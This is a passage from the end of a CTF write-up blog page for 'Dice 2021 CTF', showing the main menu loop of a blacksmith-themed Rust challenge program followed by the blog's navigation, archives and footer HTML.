scorned, penniless blacksmith to, well, a scorned, penniless blacksmith with a flag.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">menu</span>();</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> input_buf).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">choice</span>: <span class="type">i32</span> = std::<span class="type">str</span>::<span class="title function_ invoke__">from_utf8</span>(&amp;input_buf).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> choice &#123;</span><br><span class="line">            <span class="number">1</span> =&gt; &#123; stock_ptr = forge(stock_ptr, &amp;<span class="keyword">mut</span> c) &#125;,</span><br><span class="line">            <span class="number">2</span> =&gt; &#123; stock_ptr = <span class="title function_ invoke__">scrap</span>(stock_ptr, &amp;<span class="keyword">mut</span> c) &#125;,</span><br><span class="line">            <span class="number">3</span> =&gt; &#123; stock_ptr = <span class="title function_ invoke__">inspect</span>(stock_ptr, &amp;<span class="keyword">mut</span> log) &#125;,</span><br><span class="line">            <span class="number">4</span> =&gt; &#123; stock_ptr = <span class="title function_ invoke__">view_stock</span>(stock_ptr) &#125;,</span><br><span class="line">            <span class="number">5</span> =&gt; <span class="title function_ invoke__">view_log</span>(&amp;<span class="keyword">mut</span> log),</span><br><span class="line">            <span class="number">6</span> =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">                process::<span class="title function_ invoke__">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Invalid choice!&quot;</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="http://tacqiniu.jagger2zr.com/image-20210213231052659.png" alt="image-20210213231052659"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/16/2021dicectf/" data-id="cuidGYZ-xb6E9InDkWrpcErkV" data-title="Dice 2021 CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/02/25/2021darkconctf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DarkCon 2021 CTF
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/01/25/2021bamboofox/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2021 ACSC CTF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/18/train0927/">train0927</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 xrivendell7<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
